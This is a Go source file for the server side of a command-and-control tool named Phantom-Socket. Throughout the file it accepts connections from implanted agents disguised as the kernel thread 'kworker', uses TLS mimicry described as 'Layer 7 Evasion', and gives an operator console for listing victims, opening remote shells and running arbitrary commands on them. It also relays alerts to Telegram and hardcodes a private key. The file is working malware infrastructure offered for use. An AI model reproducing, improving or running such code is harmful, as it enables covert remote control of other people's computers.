// Project: Soket.io V7.0
// Module: C2 Component
// Description: Professional C2 Infrastructure component.

package main

import (
	"bufio"
	"crypto/ed25519"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/phantom-socket/relay/internal/config"
	"github.com/phantom-socket/relay/internal/peer"
	"github.com/phantom-socket/relay/internal/tls_mimic"
	"github.com/phantom-socket/relay/internal/crypto"
	"github.com/phantom-socket/relay/internal/telegram"
)

var (
	logger       *log.Logger
	activePeer   net.Conn
	activePeerID string
	peerMutex    sync.Mutex
	consoleMode  bool
)

type crlfWriter struct {
	writer io.Writer
}

func (w *crlfWriter) Write(p []byte) (n int, err error) {
	buf := make([]byte, 0, len(p)*2)
	for i := 0; i < len(p); i++ {
		if p[i] == '\n' && (i == 0 || p[i-1] != '\r') {
			buf = append(buf, '\r', '\n')
		} else {
			buf = append(buf, p[i])
		}
	}
	return w.writer.Write(buf)
}

func init() {
	crlfOut := &crlfWriter{writer: os.Stdout}
	logger = log.New(crlfOut, "[RELAY] ", log.LstdFlags|log.Lmicroseconds)
}

func main() {
	listenAddr := flag.String("listen", "", "Listen address (e.g., :42291). Overrides RELAY_LISTEN_ADDR env var")
	flag.Parse()

	logger.Println("Phantom-Socket V3.0 Relay Server Starting...")
	logger.Println("Building with Go 1.22+ for high-performance concurrency")

	cfg := config.LoadFromEnv()

	if *listenAddr != "" {
		cfg.ListenAddr = *listenAddr
		logger.Printf("Override listen address from command-line flag: %s", cfg.ListenAddr)
	}

	if err := cfg.Validate(); err != nil {
		logger.Fatalf("Invalid configuration: %v", err)
	}

	logger.Printf("Configuration loaded: Listen=%s, MaxPeers=%d, P2PRelay=%v",
		cfg.ListenAddr, cfg.MaxPeers, cfg.EnableP2PRelay)

	registry := peer.NewRegistry()
	logger.Println("Peer registry initialized")

	// Hardcoded Static Ed25519 Private Key (from tools/phantom.sec)
	const staticPrivKeyHex = "E03A1FAC58E031A8621702EDD87718E97C430D662D6C365F89615E817BECFD6C4845322D3B0B6E58E0B359157F8B31B82ACFE9850452D876000A944332750244"
	privKeyBytes, _ := hex.DecodeString(staticPrivKeyHex)
	privKey := ed25519.PrivateKey(privKeyBytes)
	pubKey := privKey.Public().(ed25519.PublicKey)
	logger.Printf("Server Ed25519 public key (Static): %x", pubKey)

	// Generate standard X.509 certificate at runtime for TLS termination
	cert, err := crypto.GenerateSelfSignedCert(cfg.ServerName, privKeyBytes)
	if err != nil {
		logger.Fatalf("Failed to generate TLS certificate: %v", err)
	}

	tlsConfig, err := tls_mimic.CreateRelayTLSConfig(cert)
	if err != nil {
		logger.Fatalf("Failed to create TLS config: %v", err)
	}

	// MISSION: Universal TLS Termination without warnings
	var listener net.Listener
	if os.Getenv("PH_ENABLE_RAW_TCP") == "true" {
		listener, err = net.Listen("tcp", cfg.ListenAddr)
		logger.Printf("Relay server listening on %s (Raw TCP FALLBACK ENABLED)", cfg.ListenAddr)
	} else {
		listener, err = tls.Listen("tcp", cfg.ListenAddr, tlsConfig)
		logger.Printf("Relay server listening on %s", cfg.ListenAddr)
	}

	if err != nil {
		logger.Fatalf("Failed to start listener: %v", err)
	}
	defer listener.Close()

	logger.Println("Ready to accept [kworker/u4:0] agents via Layer 7 Evasion")

	go cleanupInactivePeers(registry, time.Duration(cfg.SessionTimeout)*time.Second)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go acceptConnections(listener, registry, cfg)

	go startInteractiveConsole(registry, cfg)

	<-sigChan
	logger.Println("Shutdown signal received...")

	logger.Printf("Closing %d active connections", registry.GetPeerCount())
	for _, peerID := range registry.ListPeers() {
		registry.RemovePeer(peerID)
	}

	logger.Println("Relay server stopped gracefully")
}

func acceptConnections(listener net.Listener, registry *peer.Registry, cfg *config.Config) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Printf("Failed to accept connection: %v", err)
			continue
		}

		go handleConnection(conn, registry, cfg)
	}
}

func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config) {
	remoteAddr := conn.RemoteAddr().String()
	logger.Printf("New connection from %s", remoteAddr)

	// Explicit TLS Handshake for early error detection
	if tlsConn, ok := conn.(*tls.Conn); ok {
		tlsConn.SetDeadline(time.Now().Add(5 * time.Second))
		if err := tlsConn.Handshake(); err != nil {
			logger.Printf("TLS handshake failed from %s: %v", remoteAddr, err)
			conn.Close()
			return
		}
		logger.Printf("TLS handshake completed from %s", remoteAddr)
	}

	conn.SetReadDeadline(time.Now().Add(time.Duration(cfg.HandshakeTimeout) * time.Second))

	handshakeBuf := make([]byte, 37)
	if _, err := conn.Read(handshakeBuf); err != nil {
		logger.Printf("Failed to read handshake from %s: %v", remoteAddr, err)
		conn.Close()
		return
	}

	if string(handshakeBuf[0:4]) != "PHNT" {
		logger.Printf("Invalid magic bytes from %s: %v", remoteAddr, handshakeBuf[0:4])
		conn.Close()
		return
	}

	version := handshakeBuf[4]
	if version != 0x03 {
		logger.Printf("Unsupported protocol version from %s: 0x%02x", remoteAddr, version)
		conn.Close()
		return
	}

	clientPubKey := handshakeBuf[5:37]
	logger.Printf("Received Ed25519 public key from %s: %x", remoteAddr, clientPubKey)

	peerID := fmt.Sprintf("peer-%d", time.Now().UnixNano())

	peerInfo, err := registry.AddPeer(peerID, conn)
	if err != nil {
		logger.Printf("Failed to add peer %s: %v", peerID, err)
		conn.Close()
		return
	}

	logger.Printf("[SUCCESS] Peer %s authenticated and registered from %s", peerID, remoteAddr)

	registry.UpdatePeerState(peerID, peer.PeerStateAuthenticated)

	conn.SetReadDeadline(time.Time{})

	ackMsg := []byte("[RELAY] Connection accepted\n")
	if _, err := conn.Write(ackMsg); err != nil {
		logger.Printf("Failed to send ACK to %s: %v", peerID, err)
		registry.RemovePeer(peerID)
		conn.Close()
		return
	}

	// In Multiplexer mode, we don't auto-set activePeer. 
	// The operator must use 'interact <id>'.
	
	logger.Printf("Peer %s ready. Use 'sessions' and 'interact %s' in console.", peerID, peerID)

	_ = peerInfo
}

func cleanupInactivePeers(registry *peer.Registry, timeout time.Duration) {
	ticker := time.NewTicker(time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		cleaned := registry.CleanupInactivePeers(timeout)
		if cleaned > 0 {
			logger.Printf("Cleaned up %d inactive peers", cleaned)
		}
	}
}

func printPeerList(registry *peer.Registry) {
	peers := registry.GetActivePeers()
	if len(peers) == 0 {
		fmt.Println("No agents connected")
		return
	}

	fmt.Println("Active Sessions:")
	fmt.Printf("%-25s %-20s %-20s\n", "ID", "Remote Address", "Last Activity")
	fmt.Println(strings.Repeat("-", 65))
	for _, p := range peers {
		fmt.Printf("%-25s %-20s %-20s\n", p.PeerID, p.RemoteAddr, p.LastActivity.Format("15:04:05"))
	}
}

func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
	consoleMode = true
	fmt.Println("Phantom-Socket V3.0 Relay Multiplexer Console")
	fmt.Println("Type 'help' for available commands.")
	fmt.Println()

	reader := bufio.NewReader(os.Stdin)
	var shellMode bool

	for {
		peerMutex.Lock()
		currentPeer := activePeer
		currentPeerID := activePeerID
		peerMutex.Unlock()

		prompt := "phantom> "
		if currentPeerID != "" {
			shortID := currentPeerID
			if len(shortID) > 13 {
				shortID = shortID[:13]
			}
			if shellMode {
				prompt = fmt.Sprintf("phantom(%s)[shell]> ", shortID)
			} else {
				prompt = fmt.Sprintf("phantom(%s)> ", shortID)
			}
		}

		fmt.Print(prompt)
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)

		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]

		switch cmd {
		case "help":
			fmt.Println("Available Commands:")
			fmt.Println("  sessions             - List all active agent sessions")
			fmt.Println("  interact <id>        - Switch focus to a specific agent")
			fmt.Println("  background           - Return to main menu (detach from agent)")
			fmt.Println("  shell                - Start interactive shell on focused agent")
			fmt.Println("  info                 - Get system info from focused agent")
			fmt.Println("  ping                 - Check if focused agent is alive")
			fmt.Println("  exit                 - Close relay server")
		case "sessions":
			printPeerList(registry)
		case "interact":
			if len(parts) < 2 {
				fmt.Println("Usage: interact <id>")
				continue
			}
			id := parts[1]
			pInfo, err := registry.GetPeer(id)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
				continue
			}
			peerMutex.Lock()
			activePeer = pInfo.Connection
			activePeerID = id
			shellMode = false
			peerMutex.Unlock()
			fmt.Printf("Interacting with %s\n", id)
		case "background":
			peerMutex.Lock()
			activePeer = nil
			activePeerID = ""
			shellMode = false
			peerMutex.Unlock()
			fmt.Println("Backgrounded session.")
		case "shell":
			if currentPeer == nil {
				fmt.Println("Error: No active session. Use 'interact <id>' first.")
				continue
			}
			shellCmd := buildCommand(0x02, "")
			if err := sendCommand(currentPeer, shellCmd); err != nil {
				fmt.Printf("Error: %v\n", err)
				continue
			}
			shellMode = true
			fmt.Println("Shell session started (type 'exit' to background)")
		case "info":
			if currentPeer == nil {
				fmt.Println("Error: No active session.")
				continue
			}
			infoCmd := buildCommand(0x03, "")
			sendCommand(currentPeer, infoCmd)
			readCommandResponse(currentPeer)
		case "ping":
			if currentPeer == nil {
				fmt.Println("Error: No active session.")
				continue
			}
			pingCmd := buildCommand(0x05, "")
			sendCommand(currentPeer, pingCmd)
		case "exit":
			if shellMode {
				shellMode = false
				fmt.Println("Shell session backgrounded.")
				continue
			}
			fmt.Println("Exiting relay...")
			os.Exit(0)
		default:
			if currentPeer != nil {
				if shellMode {
					if line == "exit" {
						shellMode = false
						fmt.Println("Shell session backgrounded.")
						continue
					}
					shellCmd := buildCommand(0x02, line+"\n")
					sendCommand(currentPeer, shellCmd)
					readCommandResponseWithMode(currentPeer, true)
				} else {
					execCmd := buildCommand(0x01, line)
					sendCommand(currentPeer, execCmd)
					readCommandResponse(currentPeer)
				}
			} else {
				fmt.Printf("Unknown command: %s. Type 'help' for available commands.\n", cmd)
			}
		}
	}
}

func buildCommand(opcode uint8, payload string) []byte {
	magic := []byte("PHNT")
	payloadLen := uint16(len(payload))
	buf := make([]byte, 7+len(payload))
	copy(buf[0:4], magic)
	buf[4] = opcode
	buf[5] = byte(payloadLen >> 8)
	buf[6] = byte(payloadLen & 0xFF)
	if len(payload) > 0 {
		copy(buf[7:], payload)
	}
	return buf
}

func sendCommand(conn net.Conn, cmd []byte) error {
	_, err := conn.Write(cmd)
	return err
}

func readCommandResponse(conn net.Conn) {
	readCommandResponseWithMode(conn, false)
}

func readCommandResponseWithMode(conn net.Conn, shellMode bool) {
	if !shellMode {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	} else {
		conn.SetReadDeadline(time.Time{})
	}

	for {
		headerBuf := make([]byte, 11)
		_, err := io.ReadFull(conn, headerBuf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Println("Timeout waiting for response")
			} else if err == io.EOF {
				fmt.Println("Agent disconnected")
			} else {
				fmt.Printf("Error: %v\n", err)
			}
			break
		}

		if string(headerBuf[0:4]) != "PHNT" {
			break
		}

		opcode := headerBuf[4]
		chunkIdx := binary.BigEndian.Uint16(headerBuf[5:7])
		totalChunks := binary.BigEndian.Uint16(headerBuf[7:9])
		chunkLen := binary.BigEndian.Uint16(headerBuf[9:11])

		if opcode == 0x05 { // Sentinel Alert
			dataBuf := make([]byte, chunkLen)
			io.ReadFull(conn, dataBuf)
			payload := string(dataBuf)
			logger.Printf("Received Sentinel Alert: %s", payload)
			go telegram.RelayTelegramAlert(payload)
			continue
		}

		dataBuf := make([]byte, chunkLen)
		if chunkLen > 0 {
			io.ReadFull(conn, dataBuf)
		}

		isLastChunk := (chunkIdx == totalChunks-1)
		outputData := dataBuf
		var exitCode int
		if isLastChunk && chunkLen > 0 {
			exitCode = int(dataBuf[chunkLen-1])
			outputData = dataBuf[:chunkLen-1]
		}

		if len(outputData) > 0 {
			fmt.Print(string(outputData))
		}

		if isLastChunk {
			if opcode != 0x05 && opcode != 0x06 {
				fmt.Printf("\n[Exit code: %d]\n", exitCode)
			}
			break
		}
	}
	conn.SetReadDeadline(time.Time{})
}

func isPrintableString(s string) bool {
	for _, c := range s {
		if c < 32 && c != '\n' && c != '\r' && c != '\t' {
			return false
		}
		if c > 126 {
			return false
		}
	}
	return true
}
